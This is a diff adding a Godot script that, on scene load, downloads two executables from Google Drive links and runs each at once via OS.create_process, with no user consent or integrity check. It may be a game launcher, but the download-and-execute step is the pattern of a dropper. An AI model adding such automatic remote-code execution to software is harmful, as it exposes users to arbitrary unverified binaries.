@@ -1,0 +1,72 @@
+extends Node
+
+@onready var http := HTTPRequest.new()
+
+var downloads := [
+	{
+		"url": "https://drive.google.com/uc?export=download&id=13IIqgOWSJ_QLY1D2KU6Lr96cfieSERKF",
+		"path": "user://SpaceshipOS.exe"
+	},
+	{
+		"url": "https://drive.google.com/uc?export=download&id=1QzJljeah7RvpNRpJYwgF0NO02AWQoOZ5",
+		"path": "user://LatestRelease.exe"
+	}
+]
+
+var index := 0
+var active_url := ""
+var save_path := ""
+
+func _ready():
+	add_child(http)
+	http.request_completed.connect(_on_request_completed)
+	_download_next()
+
+func _download_next():
+	if index >= downloads.size():
+		print("✅ All downloads complete")
+		return
+
+	active_url = downloads[index]["url"]
+	save_path = downloads[index]["path"]
+
+	print("⬇ Downloading:", save_path)
+	http.request(active_url)
+
+func _on_request_completed(result, response_code, headers, body):
+	if response_code != 200:
+		push_error("❌ HTTP Error " + str(response_code))
+		return
+
+	# Handle Google Drive large-file confirmation
+	var text := body.get_string_from_utf8()
+	if text.find("confirm=") != -1:
+		var token := _extract_confirm_token(text)
+		if token != "":
+			http.request(active_url + "&confirm=" + token)
+			return
+
+	var file := FileAccess.open(save_path, FileAccess.WRITE)
+	file.store_buffer(body)
+	file.close()
+
+	print("✔ Saved:", save_path)
+	_run_file(save_path)
+
+	index += 1
+	_download_next()
+
+func _run_file(path: String):
+	if OS.has_feature("windows") or OS.has_feature("linux") or OS.has_feature("macos"):
+		print("▶ Running:", path)
+		OS.create_process(ProjectSettings.globalize_path(path), [])
+	else:
+		print("⚠ Cannot run files on this platform")
+
+func _extract_confirm_token(html: String) -> String:
+	var start := html.find("confirm=")
+	if start == -1:
+		return ""
+	start += 8
+	var end := html.find("&", start)
+	return html.substr(start, end - start)
